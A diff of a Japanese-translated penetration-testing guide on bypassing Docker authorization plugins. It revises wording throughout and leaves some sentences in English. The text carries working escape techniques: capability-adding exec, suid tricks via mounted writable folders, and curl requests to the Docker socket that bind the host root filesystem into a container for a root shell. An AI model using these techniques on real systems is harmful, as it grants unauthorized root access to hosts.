@@ -18,11 +18,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 # 基本アーキテクチャ
 
-Docker Authプラグインは、**外部**の**プラグイン**であり、**ユーザー**と**要求されたアクション**に応じて、Dockerデーモンに対する**アクション**を**許可/拒否**するために使用できます。
+Docker Authプラグインは、**外部**の**プラグイン**であり、**ユーザー**や**要求されたアクション**に応じて、Dockerデーモンに対する**アクション**を**許可/拒否**するために使用できます。
 
 **[以下の情報はドキュメントからのものです](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-**HTTP** **リクエスト**がCLIまたはエンジンAPIを介してDocker **デーモン**に送信されると、**認証** **サブシステム**はリクエストをインストールされた**認証** **プラグイン**に**渡します**。リクエストにはユーザー（呼び出し元）とコマンドコンテキストが含まれています。**プラグイン**は、リクエストを**許可**するか**拒否**するかを決定する責任があります。
+**HTTP** **リクエスト**がCLIまたはエンジンAPIを介してDocker **デーモン**に送信されると、**認証** **サブシステム**はリクエストをインストールされた**認証** **プラグイン**に**渡します**。リクエストにはユーザー（呼び出し元）とコマンドのコンテキストが含まれています。**プラグイン**は、リクエストを**許可**するか**拒否**するかを決定する責任があります。
 
 以下のシーケンス図は、許可と拒否の認可フローを示しています：
 
@@ -34,17 +34,17 @@ Docker Authプラグインは、**外部**の**プラグイン**であり、**�
 
 HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgrade`）については、`exec`のように、認可プラグインは最初のHTTPリクエストに対してのみ呼び出されます。プラグインがコマンドを承認すると、その後のフローには認可が適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`のようにチャンク化されたHTTPレスポンスを返すコマンドについては、HTTPリクエストのみが認可プラグインに送信されます。
 
-リクエスト/レスポンス処理中に、一部の認可フローはDockerデーモンに追加のクエリを行う必要がある場合があります。そのようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加クエリを有効にするために、プラグインは管理者が適切な認証とセキュリティポリシーを設定できる手段を提供する必要があります。
+リクエスト/レスポンス処理中に、一部の認可フローはDockerデーモンに追加のクエリを行う必要がある場合があります。そのようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加のクエリを有効にするために、プラグインは管理者が適切な認証とセキュリティポリシーを設定できる手段を提供する必要があります。
 
 ## 複数のプラグイン
 
-あなたは、Dockerデーモンの**起動**の一部として**プラグインを登録**する責任があります。**複数のプラグインをインストールし、連鎖させる**ことができます。この連鎖は順序付けることができます。デーモンへの各リクエストは、順番にチェーンを通過します。**すべてのプラグインがリソースへのアクセスを許可**したときのみ、アクセスが許可されます。
+あなたは、Dockerデーモンの**起動**の一部として**プラグイン**を**登録**する責任があります。**複数のプラグインをインストールし、連鎖させる**ことができます。この連鎖は順序付けることができます。デーモンへの各リクエストは、順番にチェーンを通過します。**すべてのプラグインがリソースへのアクセスを許可**したときのみ、アクセスが許可されます。
 
 # プラグインの例
 
 ## Twistlock AuthZ Broker
 
-プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**リクエストを認可するためにプラグインが**読み取る**シンプルな**JSON**ファイルを作成できます。したがって、どのAPIエンドポイントが各ユーザーに到達できるかを非常に簡単に制御する機会を提供します。
+プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**リクエストを認可するために**プラグインが**読み取る**シンプルな**JSON**ファイルを作成できます。したがって、どのAPIエンドポイントが各ユーザーに到達できるかを非常に簡単に制御する機会を提供します。
 
 これは、アリスとボブが新しいコンテナを作成できるようにする例です：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
@@ -64,7 +64,7 @@ HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgr
 
 この列挙を行うには、**ツール**[**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**を使用できます。**
 
-## 許可されていない `run --privileged`
+## 許可されていない`run --privileged`
 
 ### 最小権限
 ```bash
@@ -92,7 +92,7 @@ docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a3
 ```
 Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **権限を昇格させる** inside the host.
 
-## 書き込み可能なフォルダーをマウント
+## 書き込み可能なフォルダーをマウントする
 
 In this case the sysadmin **ユーザーが `--privileged` フラグを使用してコンテナを実行することを禁止した** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
 ```bash
@@ -106,23 +106,23 @@ host> /tmp/bash
 {% hint style="info" %}
 注意してください、`/tmp` フォルダーをマウントできないかもしれませんが、**別の書き込み可能なフォルダー**をマウントできます。書き込み可能なディレクトリを見つけるには、`find / -writable -type d 2>/dev/null` を使用してください。
 
-**Linuxマシンのすべてのディレクトリが suid ビットをサポートするわけではありません！** suid ビットをサポートするディレクトリを確認するには、`mount | grep -v "nosuid"` を実行してください。例えば、通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、および `/var/lib/lxcfs` は suid ビットをサポートしていません。
+**すべてのディレクトリが Linux マシンで suid ビットをサポートするわけではありません！** suid ビットをサポートするディレクトリを確認するには、`mount | grep -v "nosuid"` を実行してください。例えば、通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、および `/var/lib/lxcfs` は suid ビットをサポートしていません。
 
-また、**`/etc`** または **設定ファイルを含む他のフォルダー** を **マウントできる** 場合、ホストで **悪用するために** それらを変更することができ、特権を昇格させることができます（おそらく `/etc/shadow` を変更することによって）。
+また、**`/etc`** または **設定ファイルを含む他のフォルダー**を**マウントできる**場合、ホストで**悪用するために**それらを変更することができ、特権を昇格させることができます（おそらく `/etc/shadow` を変更することによって）。
 {% endhint %}
 
 ## チェックされていない API エンドポイント
 
-このプラグインを設定する sysadmin の責任は、各ユーザーがどのアクションをどの特権で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に対して **ブラックリスト** アプローチを取ると、攻撃者が **特権を昇格させる** 可能性のある **いくつかを忘れてしまう** かもしれません。
+このプラグインを設定する sysadmin の責任は、各ユーザーがどのアクションをどの特権で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に対して**ブラックリスト**アプローチを取ると、**いくつかの重要なものを忘れてしまう**可能性があり、攻撃者が**特権を昇格させる**ことを許可するかもしれません。
 
-Docker API を確認するには [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Docker API は [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) で確認できます。
 
 ## チェックされていない JSON 構造
 
 ### ルートのバインド
 
-sysadmin が Docker ファイアウォールを設定したときに、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) の "**Binds**" のような **重要なパラメータ** を **忘れてしまった** 可能性があります。\
-次の例では、この誤設定を悪用して、ホストのルート (/) フォルダーをマウントするコンテナを作成して実行することができます：
+sysadmin が Docker ファイアウォールを設定したときに、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) の "**Binds**" のような**重要なパラメータを忘れた**可能性があります。\
+次の例では、この誤設定を悪用して、ホストのルート (/) フォルダーをマウントするコンテナを作成して実行することが可能です：
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -138,19 +138,19 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 
 ### HostConfigのBinds
 
-**ルートのBinds**と同じ指示に従い、この**リクエスト**をDocker APIに対して実行します:
+**ルートのBinds**と同じ指示に従い、Docker APIにこの**リクエスト**を実行します:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
 ### Mounts in root
 
-**Binds in root**と同様の指示に従い、Docker APIにこの**request**を実行します:
+**Binds in root**と同様の手順に従い、Docker APIにこの**request**を実行します:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
 ### Mounts in HostConfig
 
-**Binds in root**と同様の指示に従い、Docker APIにこの**リクエスト**を実行します:
+**Binds in root**と同様の指示に従い、この**リクエスト**をDocker APIに対して実行します:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
